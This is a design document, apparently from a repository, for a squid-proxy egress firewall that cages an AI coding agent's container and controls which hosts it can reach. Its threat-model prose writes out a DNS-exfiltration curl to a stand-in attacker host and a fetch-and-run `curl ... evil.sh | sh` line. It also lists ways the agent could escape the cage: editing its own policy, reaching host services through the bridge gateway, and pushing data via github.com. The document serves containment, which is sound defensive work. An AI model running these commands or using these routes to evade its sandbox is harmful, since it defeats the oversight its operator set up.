---
human-check: pending   # pending | verified — flip to verified after you read it
covers:                # source paths update-design reconciles this file against
  - compose.yaml
  - firewall/squid.conf
  - firewall/allowed-domains.txt
  - toolkit/container.nu
reconciled-at: 6dd20b1779e5df6bb4a2f60d02c1aa7674d2389d
---

# firewall — human-managed egress for the Debian image

**Runtime, not build.** This is the only subsystem that is not reached from a `bootstrap.nu` step: it wraps the finished image from outside. [`../compose.yaml`](../compose.yaml) puts the agent on a network with no way out except a squid proxy, and [`../firewall/`](../firewall/) holds the policy that proxy enforces. It applies to the **Debian rootless** run path only (see [`build.md`](build.md)); the `sbx` path gets its own allowlist from `network.allowedDomains` in [`../sbx-kit/spec.yaml`](../sbx-kit/spec.yaml).

That path has two runtimes and therefore two assemblers. Under docker, `compose.yaml` declares the whole thing. Apple `container` has no compose, so [`../toolkit/container.nu`](../toolkit/container.nu) assembles the same three pieces by hand — caged network, dual-homed squid, agent on the caged side only — from the same policy directory and the same digest-pinned image (`toolkit check` guards the two pins against each other; see [`toolkit.md`](toolkit.md)). Everything below holds for both unless it names one.

## Why it is not in the image

A firewall is runtime state. Anything baked into the image is out of the human's hands once the image is built; anything the agent can reach at runtime is not human-only. So the [`../Dockerfile`](../Dockerfile) carries **no proxy address at all** — the image stays runnable standalone with `docker run`, and the cage is something the human puts around it. A bare `docker run` therefore has no cage, and `cozy verify` fails its two `egress:` rows rather than passing quietly.

## Why two containers instead of iptables

The obvious alternative — rules inside the agent container — needs `CAP_NET_ADMIN`, which is the capability that rewrites the policy sitting *inside the box being sealed*. The property here comes from **topology, not permissions**: the agent's network is created with `internal: true`, so Docker attaches no gateway. It has no default route, cannot resolve external names, and a raw-IP connection fails immediately. Its only neighbour is the proxy. Nothing in the stack needs `CAP_NET_ADMIN`, so the agent container can `cap_drop: [ALL]` — which also closes the `docker exec -u root` door, since root without `NET_ADMIN` still cannot add a route.

## Why the policy lives outside the repo

`~/.config/cozy/firewall/` (overridable with `COZY_FIREWALL`) is the live policy; [`../firewall/`](../firewall/) in the repo is only a template. The reason is the development pattern itself: pointing `COZY_WORKSPACE` at the cozy checkout — how cozy is worked on, and what the README teaches — puts `compose.yaml`, the `Dockerfile` and `firewall/` inside the agent's writable mount, and all three are re-read from the host on the next `up`. An agent could delete `internal: true` from its own cage and the human's routine start-of-session command would apply it. Moving the live policy out makes "the agent cannot reach the policy" hold structurally, whatever `COZY_WORKSPACE` is set to. **The `:ro` on the proxy's mount is not the mechanism** — it protects the file from squid, not from the agent; don't cite it as the reason.

The directory is mounted whole, not the two files individually: a bind-mounted *file* pins an inode, so an editor that saves atomically (write temp + rename) leaves squid reading the old copy while the human's edit silently never applies. An in-place append would be picked up, so the failure mode is inconsistent — and it favours the attacker.

The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace. `WORKSPACE_DIR` is set by hand to the same mount path: `sbx` injects it, compose has to, and without it `cozy sandbox-state` and `cozy dev-link` hard-error with nothing to fall back on.

## Why a missing policy stops everything

Three separate defaults all fail the same way — the proxy comes up healthy-looking with no policy, the agent comes up fine, and the human sees a working stack with mysteriously dead network. Each is turned into a loud, named failure instead:

- The policy mount uses the long form with `create_host_path: false`. The short `src:dst:ro` form lets Docker invent the missing source as an empty root-owned directory, and squid then finds no `squid.conf`. Refusing to create it turns a forgotten `cp -r firewall ~/.config/cozy/firewall` into an error naming the path. `toolkit/container.nu` already errored on this; the two run paths now agree.
- A `test -f /etc/squid/policy/squid.conf` healthcheck, because the directory can exist and still be empty or half-copied — which the mount cannot catch. The agent's `depends_on` uses `condition: service_healthy`, not the bare list form: that one waits only for "started", so a proxy that started and instantly died still let the agent up.
- **No restart policy**, on purpose. `unless-stopped` was here, and the failure this proxy actually has is a missing or unparseable policy, which no restart heals — it looped and hid the cause behind a container that was always about to be up. Now it exits once and `docker compose logs egress` says why. A proxy that stays down also fails closed: the agent keeps its route to nowhere.

The proxy image is pinned by **digest with no tag** — with both, the tag is ignored and reads as a lie (this carried `:latest` while frozen). It holds the policy and is the one container with internet, so it must not change under a `pull`. Frozen also means upstream CVE fixes never arrive; re-pin deliberately.

## Why no CA and no TLS interception

Squid refuses the `CONNECT` **before** the handshake starts, so a blocked request never leaves the client — headers and auth tokens included. An intercepting proxy would have to read those before it could reject them, which is the opposite of what this is for. Allowed domains are tunneled end-to-end and keep the origin's own certificate; no CA is installed anywhere. `cozy verify`'s `tls:` row reads that end: it handshakes with `api.anthropic.com` and reports the issuer. Having no CA is also why the row cannot assert much *here* — it compares the issuer against the proxy CA's own CN, read from `PROXY_CA_CERT_B64`, and on this path that variable is unset. So the row is this path's positive control (an allowlisted host is genuinely reachable), and the interception assertion only bites where a CA does exist, as under `sbx`.

## What squid.conf restates and why

[`../firewall/squid.conf`](../firewall/squid.conf) replaces stock `squid.conf` wholesale, so anything stock provided has to be written back:

- **`Safe_ports`** — `http_access allow allowed_domains` carries no port constraint on its own. Only `CONNECT` was limited to 443, so a plain request to `http://github.com:22/` made squid open GitHub's SSH port and relay attacker-chosen bytes to it. Stock ships these ACLs for exactly this reason.
- **`internal_dst`** — the proxy can reach what the caged container cannot (the Docker bridge gateway, other compose networks, its own loopback). Without a `dst` rule the allowlist is a name filter the agent steps around by asking the proxy to fetch an internal address for it. `dstdomain` never matches a bare IP so `deny all` already caught most of it; this makes the intent explicit and covers names that resolve inward.
- **`dstdomain`, not regex** — it matches the host label-wise, so `api.anthropic.com.evil.example` cannot match an entry. That is why the list is domains.
- **`deny !allowed_domains` comes before `deny internal_dst`**, and the order is the point, not style. `internal_dst` is a `dst` ACL, so squid must resolve the hostname before it can decide — and it was doing that for names it was about to refuse anyway, which made the proxy a DNS exfiltration channel: `curl -x $proxy http://<data>.attacker.example/` got the refusal logged and the lookup sent. `dstdomain` is a pure string match with no lookup, so denying the non-allowlisted name first means a blocked name never leaves the container at all — which is what "a blocked request never leaves the client" promises. The `internal_dst` rule is then reached only for hosts already on the list, whose resolve was going to happen anyway.
- **`pinger_enable off`** — the helper needs `CAP_NET_RAW` for ICMP and logs a repeating FATAL without it, while only measuring RTT to pick between peers that do not exist here. The log should show policy decisions and nothing else.
- **`access_log stdio:/var/log/squid/access.log`**, not `/dev/stdout` — squid drops to user `proxy`, which cannot open `/dev/stdout`, and dies at startup. The image's entrypoint already tails that path to stdout, so `docker compose logs -f egress` still shows refusals — which the human managing the list needs.

## What the allowlist is for

[`../firewall/allowed-domains.txt`](../firewall/allowed-domains.txt) bounds **which hosts** the agent can reach, and nothing beyond that. It is not a code filter: squid sees only the hostname in the `CONNECT`, never the path or the body, so an allowed host that lets anyone publish carries anything through — `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes the list cleanly, and `github.com`, the `githubusercontent` hosts and `ghcr.io` are all open publishing platforms. Filtering by content would need TLS interception, which is exactly what this refuses to do (see above); host-only filtering is the price of that refusal, not an oversight. It is not containment either: `github.com` carries `git push`, so with any credential in the workspace it is a full outbound channel. A much smaller list would be needed if the goal were keeping data in.

The entries were not guessed — each was confirmed by running the real tool inside the cage. Four groups. **Claude Code**: the API, the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them), and the docs/console hosts `cozy docs claude` mirrors; its telemetry host is deliberately absent and nothing breaks. **git over https**: the clone hosts, plus `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu` — `objects` as the other host that redirect has historically landed on, and `github-cloud` where git-lfs objects actually live. **Rust**: rustup's installer, the toolchain and the crates registry, so a `cozy install nushell|zellij|polars` doesn't clone successfully and then die on crates.io — the worst-shaped failure. **Homebrew**: the three-host bottle chain (formula index → registry token + manifest → blob). The last two groups are droppable if the image's toolset is enough. Each entry carries its own caller in a comment; `api.github.com`'s sole one is nu-goodies' nightly-release check, since `git clone` does not use it and `gh` is not installed here.

Editing the list is a restart, not a rebuild: `docker compose restart egress`, or `nu toolkit/container.nu reload-egress <name>` on Apple `container`. Watch what gets refused with `docker compose logs -f egress`.

## Limits accepted, not fixed

- **The Docker bridge gateway stays reachable.** `internal: true` removes the default route but the bridge address is in-subnet, so a process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly, bypassing the allowlist. Confirmed on Docker 29.6 by proxying a blocked request through a host-bound squid from inside the cage. A container's *published* port (`-p`) is not reachable that way: the packet needs forwarding out of the internal network, which Docker drops, so it times out. Closing it needs a host-level `DOCKER-USER` rule, which compose cannot express, so it is documented as residual risk in [`../README.md`](../README.md) instead.
- **`COZY_WORKSPACE` must not contain this repo**, or any copy of the policy (see above).
- **`/var/run/docker.sock` must never be mounted into the agent**, and the agent must never join the `docker` group. That is root on the host; no network policy survives it.
- **`cozy verify` is a smoke test, not a tamper detector** — it lives at a path the agent owns.

## How verify checks it

Two rows in [`../cozy-module/verify.nu`](../cozy-module/verify.nu), both shaped by false passes found in review. `egress: no direct route` probes an IP literal with the proxy bypassed and requires the attempt to fail — this is what `internal: true` actually provides, and unlike reading `*_PROXY` it cannot be faked by an env var on a normal bridge network. `egress: default deny` sends a canary over **plain http**, where a real refusal is a 403 block page; over https every flavour of no-network (dead proxy, unresolvable name, timeout) also yields `000`, so a broken cage would have scored the strongest pass. It is pointed at the proxy with `-x` rather than through the environment, because curl honours only the lowercase `http_proxy` for http URLs while sbx sets just the uppercase one.
